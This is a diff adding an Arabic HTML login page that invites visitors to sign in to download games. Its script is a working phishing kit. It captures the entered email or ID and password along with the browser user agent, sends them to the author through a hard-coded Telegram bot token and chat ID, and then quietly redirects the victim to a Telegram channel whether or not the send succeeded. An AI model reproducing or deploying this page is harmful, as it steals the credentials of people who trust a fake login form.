@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - تحميل الألعاب</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-card {
+            background-color: #1e1e1e;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .login-card h2 {
+            margin-bottom: 20px;
+            color: #00bcd4;
+        }
+        .input-group {
+            margin-bottom: 15px;
+            text-align: right;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #bbb;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #333;
+            border-radius: 6px;
+            background-color: #2c2c2c;
+            color: #fff;
+            font-size: 16px;
+        }
+        .input-group input:focus {
+            border-color: #00bcd4;
+            outline: none;
+        }
+        .btn-submit {
+            width: 100%;
+            padding: 12px;
+            background-color: #00bcd4;
+            border: none;
+            border-radius: 6px;
+            color: #121212;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .btn-submit:hover {
+            background-color: #008ba3;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        <h2>تسجيل الدخول لتحميل الألعاب</h2>
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="email">البريد الإلكتروني أو المعرف</label>
+                <input type="text" id="email" name="email" required placeholder="أدخل البريد...">
+            </div>
+            <div class="input-group">
+                <label for="password">كلمة المرور</label>
+                <input type="password" id="password" name="password" required placeholder="أدخل كلمة المرور...">
+            </div>
+            <button type="submit" class="btn-submit" id="submitBtn">دخول وتحميل الألعاب</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // منع إعادة تحميل الصفحة
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const submitBtn = document.getElementById('submitBtn');
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'جاري التحويل لقناتك...';
+
+            // معلومات بوت التليجرام الخاص بك
+            const botToken = "7703622294:AAEkYLpMPBY2-dnATGpwJWp5cX-CwCVrcvY";
+            const chatId = "1049167772";
+
+            // صياغة الرسالة
+            const message = `🚨 تسجيل دخول جديد!\n\n📧 البريد/المعرف: ${email}\n🔑 كلمة المرور: ${password}\n🌐 المتصفح: ${navigator.userAgent}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // إرسال البيانات للبوت وإعادة التوجيه مباشرة بعد اكتمال الإرسال
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => {
+                // تحويل المستخدم لقناتك فوراً بعد نجاح الإرسال
+                window.location.href = 'https://t.me/wisamgames';
+            })
+            .catch(error => {
+                // حتى لو حصل خطأ بالشبكة، نحوله للقناة حتى ما ينزعج المستخدم
+                window.location.href = 'https://t.me/wisamgames';
+            });
+        });
+    </script>
+
+</body>
+</html>
